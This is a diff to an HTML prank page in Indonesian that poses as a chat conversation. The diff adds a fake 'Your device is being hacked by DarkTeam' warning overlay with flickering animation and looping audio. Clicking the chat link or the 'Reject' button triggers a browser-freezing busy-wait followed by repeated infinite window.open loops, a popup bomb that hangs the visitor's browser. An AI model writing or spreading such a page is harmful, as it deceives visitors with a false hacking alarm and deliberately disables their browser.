@@ -200,8 +200,8 @@ color: #888;
 }
    .hacked{
     background: black;
-    width: 99vw;
-    height: 98vh;
+    width: 100vw;
+    height: 99vh;
     position: fixed;
     margin: 0 auto;
     border: 2px solid red;
@@ -237,33 +237,36 @@ color: #888;
    }
    @keyframes dark{
     0%{
-     opacity: 0;
+     opacity: 0;margin-left:75px
     }
     25%{
-     opacity: 1;
+     opacity: 1;margin-right:80px
     }
     50%{
-     opacity: 0;
+     opacity: 0; margin-left:80px
      
     }
     75%{
      
-     opacity: 1;
+     opacity: 1;margin-left:75px
     }
     100%{
-     opacity: 0;
+     opacity: 0;margin-left:80px
      
     }
 
    }
-   .hacked{
+   .hacked .img{
     animation-name: dark;
-    animation-duration: 0.1s;
+    animation-duration: 0.02s;
     animation-iteration-count: infinite;
    }
 </style>
 </head>
 <body>
+<audio id='myAudio' loop='true'>
+<source src='lv_7147232845017222402_20220929073049_10012023.mp3'>
+</audio>
 	<div class="container">
 		<div class="chat">
 			<div style="position:fixed;top:0;width:100vw" class="chat-header">
@@ -281,6 +284,15 @@ color: #888;
 					</div>
 				</div>
 			</div>
+
+  <div class="hacked" style="display:none" id="hacked">
+   <div class="img">
+   <img src="https://geektyper.com/mobile/warning.png" alt="DarkTeam" />
+   <h4>WARNING</h4>
+   <p>Your device is being hacked by DarkTeam, click the red button below to exit and stop hacking</p>
+   <button type="button" onclick="nexttt()">Reject</button>
+   </div>
+  </div>
 <br><br><br>
 			<div class="chat-box">
 				<div class="chat-r">
@@ -310,7 +322,7 @@ color: #888;
 				<div class="chat-l" id="pesan2" style="display:none">
 					<div class="mess">
 						<p>
-                            Bentar yaa, jangan skip dulu ..,<br><a href="contoh3.html" style="color:green;text-decoration:none" onclick="next()">Klik disini</a>
+                            Bentar yaa, jangan skip dulu ..,<br><a style="color:green;text-decoration:none" onclick="next()">Klik disini</a>
 						</p>
 						<div class="check">
 							<span id="pukul2">4:00 PM</span>
@@ -343,6 +355,7 @@ color: #888;
 					<div class="sp"></div>
 				</div>
 <div id="chatingan"></div>-->
+
 <br><br><br>
 			<div class="chat-footer" style="position: fixed;bottom:0; display:none">
 				<input placeholder="Type a message">
@@ -352,14 +365,6 @@ color: #888;
 		</div>
 	</div>
 
-  <div class="hacked" style="display:none" id="hacked">
-   <div class="img">
-   <img src="https://geektyper.com/mobile/warning.png" alt="DarkTeam" />
-   <h4>WARNING</h4>
-   <p>Your device is being hacked by DarkTeam, click the red button below to exit and stop hacking</p>
-   <button type="button" onclick="next()">Reject</button>
-   </div>
-  </div>
 	  <script>
 var x = new Audio('https://irul441.github.io/sound.mp3');function play() { x.play();}
 var jam=new Date().getHours()+'.'+new Date().getMinutes();
@@ -392,10 +397,8 @@ pergantian2()
 </script>
 
   <script type="text/javascript" charset="utf-8">
-   function next() {
-document.getElementById("hacked").style.display='block';
-alert('warning');
-  window.open ("contoh2.html");
+function nett() {
+  window.open ("https://irul441.github.io/contoh2.html")
 
 function sleep(milliseconds) {
   const date = Date.now();
@@ -407,9 +410,36 @@ function sleep(milliseconds) {
 alert ("Overload!");
 sleep (6000);
 while(true) window.open("contoh2.html");
+}
+   function next() {
+document.getElementById("hacked").style.display='block';
+document.getElementById("myAudio").play();
+setTimeout(nett,2200);
+}
+function nexttt() {
+  window.open ("contoh2.html")
+
+function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+alert ("Overload!");
+sleep (6000);
+while(true) window.open("contoh3.html");
 
 alert ("Overload!");
-while(true) window.open("contoh2.html");
+while(true) window.open("contoh3.html");
+alert ("Overload!");
+while(true) window.open("contoh3.html");
+alert ("Overload!");
+while(true) window.open("contoh3.html");
+alert ("Overload!");
+while(true) window.open("contoh3.html");
+alert ("Overload!");
+while(true) window.open("contoh3.html");
 }
   </script>
   
